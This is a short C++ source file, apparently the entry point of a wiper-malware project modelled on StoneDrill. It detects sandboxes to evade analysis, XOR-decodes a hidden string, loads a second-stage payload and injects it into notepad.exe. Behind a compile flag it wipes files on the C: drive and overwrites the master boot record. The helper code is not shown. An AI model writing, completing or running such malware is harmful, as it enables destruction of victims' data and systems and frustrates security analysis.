#include <iostream>
#include <string>

#include "loader.h"
#include "injection.h"
#include "file_wiper.h"
#include "mbr_wiper.h"
#include "obfuscation.h"
#include "anti_debug.h"
#include "utils.h"

int main() {
    std::cout << "Initializing.\n";

    if (isSandboxed()) {
        std::cout << "Analysis environment detected, screw you\n";
        return 0;
    }
  
    delayExecution(2000); 

    std::string secret = xor_decrypt("\x13\x05\x01", 0x77);
    std::cout << "Confused: " << secret << "\n";

    if (!loadStageFromFile("payloads/stage2.fakebin")) {
        std::cout << "Could not load, please create it.\n";
        return 0;
    }

    injectIntoProcess("notepad.exe");

#ifdef UNSAFE_EXECUTION
    wipeFiles("C:");

    wipeMBR();
#else
    std::cout << "Secure Mode.\n";
#endif

    std::cout << "StoneDrill is now in your hands.\n";
    return 0;
}
